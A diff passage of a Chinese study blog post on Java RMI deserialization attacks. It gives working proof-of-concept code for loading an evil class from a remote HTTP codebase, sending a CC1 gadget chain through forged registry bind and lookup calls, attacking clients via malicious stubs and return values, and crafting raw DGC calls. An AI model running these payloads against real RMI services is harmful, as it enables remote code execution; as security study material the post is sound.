+<li>设置<code>java.rmi.server.codebase</code>为目标类远程地址，不是在触发端设置的，触发端并不知道地址，而是Client端提供的</li>
+<li>恶意代码需要放在恶意类的static块或readObject中(回顾原生反序列化)</li>
+</ul>
+<p>首先，这玩意儿得先设置Java安全策略</p>
+<p>你得先写一个xxx.policy</p>
+<pre class="language-policy" data-language="policy"><code class="language-policy">grant &#123;
+    permission java.security.AllPermission;
+&#125;;</code></pre>
+
+<p>这是最宽松的安全策略，java基本上可以干所有事</p>
+<p>然后因为是攻击的是服务端，所以服务端还要使用这个安全策略</p>
+<p>还要关闭useCodebaseOnly</p>
+<pre class="language-java" data-language="java"><code class="language-java">System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;); 	
+System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;127.0.0.1&quot;);&#x2F;&#x2F;指定RMI服务器的主机名为127.0.0.1
+System.setProperty(&quot;java.security.policy&quot;, &quot;D:\\ctftools\\ctfscript\\javastudy\\RMIServer\\server.policy&quot;);
+if (System.getSecurityManager() &#x3D;&#x3D; null) &#123;
+            System.out.println(&quot;Setup SecurityManager&quot;);
+            System.setSecurityManager(new SecurityManager());&#x2F;&#x2F;设置安全管理器</code></pre>
+
+<p>这个设置安全管理器一定要在设置安全策略后边，<del>真nm的，查了我一下午</del></p>
+<p>服务端的设置就完成了</p>
+<p>完整代码是</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class RMIServer &#123;
+    public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException &#123;
+        if (System.getSecurityManager() &#x3D;&#x3D; null) &#123;
+           System.out.println(&quot;Setup SecurityManager&quot;);
+           System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;); 			                                    System.setProperty(&quot;java.rmi.server.hostname&quot;, &quot;127.0.0.1&quot;);
+            System.setProperty(&quot;java.security.policy&quot;, &quot;D:\\ctftools\\ctfscript\\javastudy\\RMIServer\\server.policy&quot;);
+            System.setSecurityManager(new SecurityManager());
+
+        &#125;
+
+        System.out.println(&quot;Security Manager: &quot; + System.getSecurityManager());
+        System.out.println(&quot;Security Policy: &quot; + System.getProperty(&quot;java.security.policy&quot;));
+
+        IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl();
+
+        &#x2F;&#x2F; 设置安全策略后再创建注册中心
+        LocateRegistry.createRegistry(1099);
+
+        Naming.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;iRemoteObj&quot;, iRemoteObj);
+        System.out.println(&quot;Registry运行中......&quot;);
+    &#125;
+&#125;</code></pre>
+
+<p>然后再准备一个恶意类，因为你要借助的是动态类加载，所以恶意类的恶意代码只能写在静态代码块里，或者是readObject里</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class evil implements Serializable &#123;
+
+    static &#123;
+        try &#123;
+            System.out.println(&quot;success&quot;);
+        &#125; catch (Exception e) &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+
+    private void readObject(java.io.ObjectInputStream s)
+            throws IOException, ClassNotFoundException, IOException &#123;
+        &#x2F;&#x2F; Read in the threshold (ignored), loadfactor, and any hidden stuff
+        s.defaultReadObject();
+        System.out.println(&quot;readObject&quot;);
+        Runtime.getRuntime().exec(&quot;calc&quot;);
+    &#125;
+&#125;
+</code></pre>
+
+<p>客户端</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class RMIClient implements Serializable &#123;
+    public static void main(String[] args) throws Exception&#123;
+        IRemoteObj remoteObj &#x3D; (IRemoteObj)Naming.lookup(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;iRemoteObj&quot;);
+        Object evil &#x3D; new evil();
+        String s &#x3D; remoteObj.sayHello(evil);
+    &#125;
+&#125;</code></pre>
+
+<p>我们首先来测试一下</p>
+<p>把evil这个文件放到服务端</p>
+<p>然后执行</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519212319623.png" alt="image-20230519212319623"></p>
+<p>简单跟一下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519214503718.png" alt="image-20230519214503718"></p>
+<p>还是unmarshalValue那地方对客户端传过来的参数做反序列化的时候导致的类加载和反序列化（没跟出来怎么进行了类加载，虽然确实调用了resolveClass进行了类加载，但是没看出来咋跳过去的，就贴个执行的图吧</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519220617845.png" alt="image-20230519220617845"></p>
+<p>然后接下来我们把这个evil文件从服务端删掉</p>
+<p>这时候再执行客户端会报错</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519220807873.png" alt="image-20230519220807873"></p>
+<p>再配置一下客户端</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">-Djava.rmi.server.useCodebaseOnly&#x3D;false -Djava.rmi.server.codebase&#x3D;http:&#x2F;&#x2F;192.168.1.104:8888&#x2F;</code></pre>
+
+<p>或者用代码</p>
+<pre class="language-none"><code class="language-none">System.setProperty(&quot;java.rmi.server.useCodebaseOnly&quot;, &quot;false&quot;);        System.setProperty(&quot;java.rmi.server.codebas&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;&quot;);</code></pre>
+
+<p>然后用python在字节码的路径下面开个8888端口的服务</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519222257800.png" alt="image-20230519222257800"></p>
+<p>这里还是报错了，但是看一眼服务器</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519222325440.png" alt="image-20230519222325440"></p>
+<p>说明服务端已经请求了这个网址，只不过因为路径问题所以没有访问到。所以换个路径</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519222502503.png" alt="image-20230519222502503"></p>
+<p>成了</p>
+<p>这个漏洞其实感觉利用面也挺小的，现在的服务应该大部分都是java8了，而这些配置的要求很难实现</p>
+<h3 id="③-替身攻击"><a href="#③-替身攻击" class="headerlink" title="③ 替身攻击"></a>③ 替身攻击</h3><p>看其他师傅的博客里说的一种，但是感觉有点鸡肋了</p>
+<blockquote>
+<p>在讨论对 Server 端的攻击时，还出现了另外一种针对参数的攻击思路，我称其为替身攻击。依旧是用来绕过当参数不是 Object，是指定类型，但是还想触发反序列化的一种讨论。</p>
+<p>大体的思路就是调用的方法参数是 <code>HelloObject</code>，而攻击者希望使用 CC 链来反序列化，比如使用了一个入口点为 HashMap 的 POC，那么攻击者在本地的环境中将 HashMap 重写，让 HashMap 继承 HelloObject，然后实现反序列化漏洞攻击的逻辑，用来欺骗 RMI 的校验机制。</p>
+<p>这的确是一种思路，但是还不如 hook RMI 代码修改逻辑来得快，所以这里不进行测试。</p>
+</blockquote>
+<h2 id="攻击注册中心-1"><a href="#攻击注册中心-1" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h2><p>再来看攻击注册中心</p>
+<p>根据前言的内容，攻击注册中心的路径是这条</p>
+<p><strong>UnicastServerRef#oldDispatch-&gt;RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心</strong></p>
+<p>其实对于注册中心而言，他根本就不需要知道哪个是客户端，哪个是服务端，他只需要知道有人调用了bind和lookup这些方法就行了</p>
+<p>调用bind的就是服务端要绑定方法，调用lookup就是客户端要查找方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230519133544155.png" alt="image-20230519133544155"></p>
+<p>但是由于参数的问题<code>lookup</code>、<code>unbind</code>的参数类型都是String，这在运行前编写代码时限制了我们传入恶意Object。不过可以跟攻击服务端的时候的方式一样，去绕过这个</p>
+<h3 id="调用bind-amp-rebind"><a href="#调用bind-amp-rebind" class="headerlink" title="调用bind&amp;rebind"></a>调用bind&amp;rebind</h3><p>bind和rebind这两个实际上就是服务端攻击注册中心，但是利用价值不是很高，因为高版本java的服务端和注册中心本来就在一起，因此不需要去打</p>
+<p><strong>还有一个问题就是，如果服务端和客户端在一起，那可以直接通过<code>Registry registry = LocateRegistry.createRegistry(1098)</code>的方式获取注册中心，然后进行绑定，也就不需要借助stub进行代理然后通信了，可以直接和skel通信，那么在skel里，由于反序列化的是网络通信传过来的东西，现在没网络通信了，自然没东西进行反序列化了</strong></p>
+<p>所以必须使用<code>Registry registry = LocateRegistry.getRegistry(1098);</code>来获取注册中心</p>
+<p>poc</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class RMIServer &#123;
+    public static void main(String[] args) throws IOException, AlreadyBoundException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;
+        &#x2F;&#x2F;创建远程对象
+        IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl();
+        &#x2F;&#x2F;创建注册中心
+        LocateRegistry.createRegistry(1098);
+        &#x2F;&#x2F;获取注册中心
+        Registry registry &#x3D; LocateRegistry.getRegistry(1098);
+        &#x2F;&#x2F;这就是个单纯的cc1的链
+        Object o &#x3D; cc1.cc1exp();
+        &#x2F;&#x2F;下面部分就是创建一个Remote类型的动态代理，因为bind的第二个参数要求传入Remote类型的
+        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);
+        HashMap&lt;String, Object&gt; map &#x3D; new HashMap&lt;&gt;();
+        map.put(&quot;ethe&quot;,o);
+        declaredConstructor.setAccessible(true);
+        InvocationHandler o1 &#x3D; (InvocationHandler)declaredConstructor.newInstance(Override.class,map);
+        Remote remote &#x3D; (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, o1);
+        registry.bind(&quot;iRemoteObj&quot;,remote);
+&#x2F;&#x2F;        Naming.bind(&quot;rmi:&#x2F;&#x2F;127.0.0.1&#x2F;iRemoteObj&quot;,iRemoteObj);
+    &#125;
+&#125;</code></pre>
+
+<p>这里我本来想让这个cc1的文件直接继承Remote接口的，但是发现即使继承了，由于他返回的是个HashMap，也不能让HashMap强转成Remote，而要让HashMap也继承Remote接口的话就只能改源码了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520122455415.png" alt="image-20230520122455415"></p>
+<h3 id="调用lookup-amp-unbind"><a href="#调用lookup-amp-unbind" class="headerlink" title="调用lookup&amp;unbind"></a>调用lookup&amp;unbind</h3><p>这两个只能传入String类型的参数</p>
+<p>由于这俩是客户端调用的，所以他们肯定是要到RegistryImpl_Stub里的lookup方法</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520123301488.png" alt="image-20230520123301488"></p>
+<p>由于参数var1只能为String类，所以我们需要自己伪造实现lookup方法，并在<code>var3.writeObject(var1);</code>中将我们的恶意类传入。</p>
+<p>首先获取ref对象，以下是RegistryImpl_Stub的继承图</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520123508569.png" alt="image-20230520123508569"></p>
+<p>ref是RemoteObject的属性，我们可以通过反射调用来获取</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520123540259.png" alt="image-20230520123540259"></p>
+<pre class="language-java" data-language="java"><code class="language-java">Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;);
+Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;);
+declaredField.setAccessible(true);
+RemoteRef ref &#x3D; (RemoteRef)declaredField.get(registry);</code></pre>
+
+<p>然后再去获得super.ref.newCall的参数operations</p>
+<p>方式一样</p>
+<pre class="language-java" data-language="java"><code class="language-java">Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;);
+Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;);
+operations_field.setAccessible(true);
+Operation[] operations &#x3D; (Operation[])operations_field.get(registry);</code></pre>
+
+<p>然后就是伪造这一部分</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520125250620.png" alt="image-20230520125250620"></p>
+<p>完整poc为</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class RMIClient &#123;
+    public static void main(String[] args) throws Exception &#123;
+&#x2F;&#x2F;        System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:7777&#x2F;&quot;);
+&#x2F;&#x2F;        evil evil &#x3D; new evil();
+        Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1097);
+&#x2F;&#x2F;        IRemoteObj remoteObj &#x3D; (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;);
+	&#x2F;&#x2F;获取ref
+        Class&lt;?&gt; RO &#x3D; Class.forName(&quot;java.rmi.server.RemoteObject&quot;);
+        Field declaredField &#x3D; RO.getDeclaredField(&quot;ref&quot;);
+        declaredField.setAccessible(true);
+        RemoteRef ref &#x3D; (RemoteRef)declaredField.get(registry);
+     &#x2F;&#x2F;获取 operations  
+        Class&lt;?&gt; RegistryImpl_Stub &#x3D; Class.forName(&quot;sun.rmi.registry.RegistryImpl_Stub&quot;);
+        Field operations_field &#x3D; RegistryImpl_Stub.getDeclaredField(&quot;operations&quot;);
+        operations_field.setAccessible(true);
+        Operation[] operations &#x3D; (Operation[])operations_field.get(registry);
+
+        Object o &#x3D; cc1.cc1exp();
+&#x2F;&#x2F;伪造lookup
+        RemoteCall var2 &#x3D; ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);
+        ObjectOutput var3 &#x3D; var2.getOutputStream();
+        var3.writeObject(o);
+        ref.invoke(var2);
+
+
+    &#125;
+&#125;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520131630621.png" alt="image-20230520131630621"></p>
+<p>攻击完成，这其实就是绕过系统自带的lookup方法，自己写一个lookup，然后就可以随意传参了。</p>
+<p>而且只需要重写到<code>super.ref.invoke(var2);</code>就行，毕竟我们只需要在注册中心的服务端调用<code>RegistryImpl_Skel#dispatch</code>然后执行我们的恶意代码。</p>
+<h2 id="攻击客户端-1"><a href="#攻击客户端-1" class="headerlink" title="攻击客户端"></a>攻击客户端</h2><p>对于客户端来说，有两个反序列化并可以被利用的地方</p>
+<ul>
+<li>从 Registry 端获取调用服务的 stub 并反序列化</li>
+<li>调用服务后获取结果并反序列化</li>
+</ul>
+<h3 id="恶意Server-Stub"><a href="#恶意Server-Stub" class="headerlink" title="恶意Server Stub"></a>恶意Server Stub</h3><p>这个和服务端攻击注册中心的方式差不多（整体上来看</p>
+<p>在服务端攻击注册中心的地方我们提到，由于服务端和注册中心在一起，倘若不使用getRegistry，则反序列化不会触发。</p>
+<p>但是现在来看，如果不触发，Client端调用lookup进行服务发现时，会拿到Server端在Registry端注册的恶意代理对象并进行反序列化。</p>
+<p>所以代码都是差不多的，只是直接用<code>LocateRegistry.createRegistry(1098);</code>获取注册中心就行</p>
+<p>客户端就正常客户端</p>
+<p>服务端代码为</p>
+<pre class="language-java" data-language="java"><code class="language-java">public class RMIServer &#123;
+    public static void main(String[] args) throws IOException, AlreadyBoundException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;
+        &#x2F;&#x2F;创建远程对象
+        IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl();
+        &#x2F;&#x2F;创建注册中心
+        Registry registry &#x3D; LocateRegistry.createRegistry(1097);
+        Object o &#x3D; cc1.cc1exp();
+        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);
+        HashMap&lt;String, Object&gt; map &#x3D; new HashMap&lt;&gt;();
+        map.put(&quot;ethe&quot;,o);
+        declaredConstructor.setAccessible(true);
+        InvocationHandler o1 &#x3D; (InvocationHandler)declaredConstructor.newInstance(Override.class,map);
+        Remote remote &#x3D; (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]&#123;Remote.class&#125;, o1);
+        registry.bind(&quot;iRemoteObj&quot;,remote);
+    &#125;
+&#125;
+</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520142100636.png" alt="image-20230520142100636"></p>
+<p>这也就是RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端的路线</p>
+<h3 id="恶意Server端返回值"><a href="#恶意Server端返回值" class="headerlink" title="恶意Server端返回值"></a>恶意Server端返回值</h3><p>根据我们之前的一些分析，我们知道，服务端会反序列化客户端传过来的参数，导致了恶意服务参数攻击。</p>
+<p>同样，客户端也会反序列化服务端返回的值，造成恶意Server端返回值攻击</p>
+<p>这里客户端和服务端都可以用正常的代码，修改实现类就行</p>
+<pre class="language-java" data-language="java"><code class="language-java">public Object sayHello(String a) throws IOException, NoSuchFieldException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException &#123;
+    String name &#x3D; this.getClass().getName();
+    System.out.println(a);
+    Object o &#x3D; cc1.cc1exp();
+    return o;
+&#125;</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520144136035.png" alt="image-20230520144136035"></p>
+<h3 id="动态类加载"><a href="#动态类加载" class="headerlink" title="动态类加载"></a>动态类加载</h3><p>和攻击服务端的一样，把角色换过来就好了，感觉没啥说的</p>
+<h2 id="攻击DGC"><a href="#攻击DGC" class="headerlink" title="攻击DGC"></a>攻击DGC</h2><p>在前言里我们还提到了用DGCImpl_Skel#dispatch和DGCImpl_Stub#dirty攻击服务端和客户端的路线</p>
+<p>它的通信过程是<strong>Server 端启动 DGCImpl，在 Registry 端注册 DGCImpl_Stub ，Client 端获取到 DGCImpl_Stub，通过其与 Server 端通信，Server 端使用 RegistryImpl_Skel 来处理</strong>。</p>
+<h3 id="DGC客户端打DGC服务端"><a href="#DGC客户端打DGC服务端" class="headerlink" title="DGC客户端打DGC服务端"></a>DGC客户端打DGC服务端</h3><p>DGC之间的通信也是借助序列化和反序列化的，我们只需要构造一个DGC通信并在指定的位置写入序列化恶意类，经由DGC传输到DGC服务端，从而触发反序列化。</p>
+<p>同时，由于 DGC 通信和 RMI 通信在 Transport 层是同样的处理逻辑，只不过根据 Client 端写入的标记ObjID(在初始化LiveRef的时候创建，DGC的ObjID是特定的<code>new ObjID(2);</code>)来区分是是由 RegistryImpl_Skel 还是 DGCImpl_Skel 来处理</p>
+<p>(这块没太懂，主要是没找到区分是是由 RegistryImpl_Skel 还是 DGCImpl_Skel 来处理的代码)</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520163947253.png" alt="image-20230520163947253"></p>
+<p>然后思路就是通过控制id值，让服务端误认为这个是DGC的东西，然后进入DGCImpl_Skel 里去触发漏洞点</p>
+<pre class="language-java" data-language="java"><code class="language-java">public static void makeDGCCall ( String hostname, int port, Object payloadObject ) throws IOException, UnknownHostException, SocketException &#123;
+  InetSocketAddress isa &#x3D; new InetSocketAddress(hostname, port);
+  Socket s &#x3D; null;
+  DataOutputStream dos &#x3D; null;
+  try &#123;
+    &#x2F;&#x2F; 在TCP(Transport)层获取连接
+    s &#x3D; SocketFactory.getDefault().createSocket(hostname, port);
+    s.setKeepAlive(true);
+    s.setTcpNoDelay(true);
+
+    &#x2F;&#x2F; 取出数据流OutputStream，这里对着类似的writeObject方法来看
+    OutputStream os &#x3D; s.getOutputStream();
+    dos &#x3D; new DataOutputStream(os);
+
+    &#x2F;&#x2F; 写一些TCP传输的必要标志
+    dos.writeInt(TransportConstants.Magic);
+    dos.writeShort(TransportConstants.Version);
+    dos.writeByte(TransportConstants.SingleOpProtocol);
+    dos.write(TransportConstants.Call);
+
+    @SuppressWarnings ( &quot;resource&quot; )
+    &#x2F;&#x2F; 下面才是真正的对应到代码层面，从TCPTransport#handleMessages方法开始
+    final ObjectOutputStream objOut &#x3D; new MarshalOutputStream(dos);
+
+    &#x2F;&#x2F; 写ObjID，2代表DGC，后面接着3个代表随机数，随便写
+    &#x2F;&#x2F; 对应sun.rmi.transport.Transport#serviceCall方法中的
+    &#x2F;&#x2F; var39 &#x3D; ObjID.read(var1.getInputStream());
+    objOut.writeLong(2); &#x2F;&#x2F; DGC
+    objOut.writeInt(0);
+    objOut.writeLong(0);
+    objOut.writeShort(0);
+
+    &#x2F;&#x2F; 选择DGCImpl的操作，dirty或clean都可以
+    &#x2F;&#x2F; 对应sun.rmi.server.UnicastServerRef#dispatch方法中的
+    &#x2F;&#x2F; int var3 &#x3D; var39.readInt();
+    objOut.writeInt(1); &#x2F;&#x2F; dirty
+
+    &#x2F;&#x2F; 写DGC接口的hash，值就是-669196253586618813L
+    &#x2F;&#x2F; 对应sun.rmi.server.UnicastServerRef#oldDispatch中的
+    &#x2F;&#x2F; var4 &#x3D; var18.readLong();
+    &#x2F;&#x2F; 以及sun.rmi.transport.DGCImpl_Skel#dispatch中的判断
+    objOut.writeLong(-669196253586618813L);
+
+    objOut.writeObject(payloadObject);
+
+    os.flush();
+  &#125;
+  finally &#123;
+    if ( dos !&#x3D; null ) &#123;
+      dos.close();
+    &#125;
+    if ( s !&#x3D; null ) &#123;
+      s.close();
+    &#125;
+  &#125;
+&#125;</code></pre>
+
+<p>原理懂了，代码写不出来<img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/QVJIZ6DSFAY9Y0PP@Q_2%7D8R.gif" alt="img"></p>
+<p>这个攻击手段<strong>实际上就是 ysoserial 中的 ysoserial.exploit.JRMPClient 的实现原理</strong></p>
+<p>DGC其实客户端、注册中心、服务端都能打，但是因为只有注册中心的端口是确认的，所以一般都是打注册中心</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520165828619.png" alt="image-20230520165828619"></p>
+<p>调用链</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230520170306699.png" alt="image-20230520170306699"></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/346762.html">https://www.freebuf.com/vuls/346762.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/">https://yagsheg.com/2021/11/29/RMI-%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/</a></p>
+<p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/520">https://goodapple.top/archives/520</a></p>
+<p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p>
+<p><a target="_blank" rel="noopener" href="https://halfblue.github.io/2021/11/02/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E4%B8%89%E9%A1%BE%E8%8C%85%E5%BA%90-%E6%94%BB%E5%87%BB%E5%AE%9E%E7%8E%B0/">RMI反序列化漏洞之三顾茅庐-攻击实现 | Halfblue</a></p>
+<p><a target="_blank" rel="noopener" href="https://townmacro.cn/2022/04/18/java-%E5%AE%89%E5%85%A8-rmi%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/">Java 安全-RMI学习总结 (townmacro.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1091/#serverrmi-server">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上） (seebug.org)</a></p>
+
                 
             </div>
             <hr/>
@@ -554,7 +943,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Ethe448.github.io/2021/08/31/%E6%80%BB%E7%BB%93/">https://Ethe448.github.io/2021/08/31/%E6%80%BB%E7%BB%93/</a>
+                    <a href="https://Ethe448.github.io/2023/05/18/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%BA%8C%EF%BC%89/">https://Ethe448.github.io/2023/05/18/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%BA%8C%EF%BC%89/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -592,8 +981,12 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E9%9A%8F%E7%AC%94/">
-                                    <span class="chip bg-color">随笔</span>
+                                <a href="/tags/web%E5%AD%A6%E4%B9%A0/">
+                                    <span class="chip bg-color">web学习</span>
+                                </a>
+                            
+                                <a href="/tags/Java/">
+                                    <span class="chip bg-color">Java</span>
                                 </a>
                             
                         </div>
@@ -1037,24 +1430,24 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2021/10/02/github%E4%BD%BF%E7%94%A8/">
+                <a href="/2023/05/19/%E8%AE%B0%E4%BA%8B%E7%B0%BF/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/14.jpg" class="responsive-img" alt="github使用">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/9.jpg" class="responsive-img" alt="记事簿">
                         
-                        <span class="card-title">github使用</span>
+                        <span class="card-title">记事簿</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ​    在学python的时候顺便学了些GitHub的使用，写个文档防止忘了
+                            
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-10-02
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-05-19
                         </span>
                         <span class="publish-author">
                             
@@ -1082,25 +1475,24 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/06/30/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                <a href="/2023/05/07/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
                     <div class="card-image">
                         
                         
-                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/10.jpg" class="responsive-img" alt="反序列化">
+                        <img src="https://epicture.oss-cn-beijing.aliyuncs.com/medias/featureimages/17.jpg" class="responsive-img" alt="fastjson反序列化">
                         
-                        <span class="card-title">反序列化</span>
+                        <span class="card-title">fastjson反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            基础知识php的序列化和反序列化主要是通过serialize和unserialize两个函数
-serialize()将一个对象转换成一个字符串，unserialize()将字符串还原为一个对象，对反序列化进行利用也主要是通过其中的魔术方法
+                            
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-30
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-05-07
                             </span>
                         <span class="publish-author">
                             
@@ -1117,8 +1509,8 @@ serialize()将一个对象转换成一个字符串，unserialize()将字符串�
                         <span class="chip bg-color">web学习</span>
                     </a>
                     
-                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                        <span class="chip bg-color">反序列化</span>
+                    <a href="/tags/Java/">
+                        <span class="chip bg-color">Java</span>
                     </a>
                     
                 </div>
